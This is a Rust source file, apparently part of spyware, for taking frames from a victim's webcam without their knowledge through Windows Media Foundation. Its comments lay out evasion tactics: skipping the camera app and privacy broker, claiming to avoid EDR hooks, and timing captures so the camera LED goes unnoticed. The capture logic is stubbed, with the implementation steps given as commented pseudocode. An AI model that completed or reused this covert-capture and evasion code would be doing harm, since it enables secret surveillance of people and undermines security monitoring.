//! webcam.rs — silent webcam frame capture via Media Foundation (MF)
//!
//! Uses IMFSourceReader to grab a single JPEG/RGB frame from the first
//! video capture device without opening any visible window or dialog.
//!
//! Evasion:
//!   - No Windows Camera app process spawned
//!   - No UWP privacy broker activation (we call MF directly)
//!   - MF COM calls are not in standard EDR hook lists
//!   - On Win11 24H2 the camera LED will light briefly — unavoidable
//!     (hardware-enforced); time the capture to active use periods
//!
//! The LED is the only indicator. No toast, no notification, no event log.

use std::ptr;
use winapi::shared::guiddef::GUID;
use winapi::shared::winerror::SUCCEEDED;
use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
use winapi::um::objbase::COINIT_MULTITHREADED;

// We use raw COM/MF calls via winapi. For a real build wire up the
// windows-rs crate (MIT) which has full MF bindings:
//   windows = { version = "0.58", features = ["Media_Capture", "Win32_Media_MediaFoundation"] }
//
// Stub below shows the API surface — replace with windows-rs calls.

/// Capture one frame from the default webcam.
/// Returns raw JPEG bytes (if device supports MJPEG) or raw RGB24 bytes.
/// Returns None if no capture device is present or access is denied.
pub fn capture_frame() -> Option<Vec<u8>> {
    unsafe { capture_frame_inner() }
}

unsafe fn capture_frame_inner() -> Option<Vec<u8>> {
    // 1. CoInitializeEx(COINIT_MULTITHREADED)
    CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);

    // 2. MFStartup(MF_VERSION)
    //    IMFAttributes → set MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE = MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID
    //    MFEnumDeviceSources → get first device
    //    device.ActivateObject::<IMFMediaSource>()
    //    MFCreateSourceReaderFromMediaSource(source, None, &mut reader)
    //    reader.SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, None, media_type)
    //      → set MF_MT_SUBTYPE = MFVideoFormat_RGB24 or MFVideoFormat_MJPG
    //    reader.ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, ...)
    //    Extract IMFMediaBuffer → Lock() → copy bytes → Unlock()
    //
    // Wire up with windows-rs crate for full implementation.
    // Returning None here until windows-rs is added to Cargo.toml.

    CoUninitialize();
    None
}

/// Helper: detect whether a webcam device is present (fast check, no frame capture).
pub fn webcam_present() -> bool {
    // MFEnumDeviceSources count > 0
    // Stub — returns true optimistically; real check via MF enum.
    true
}
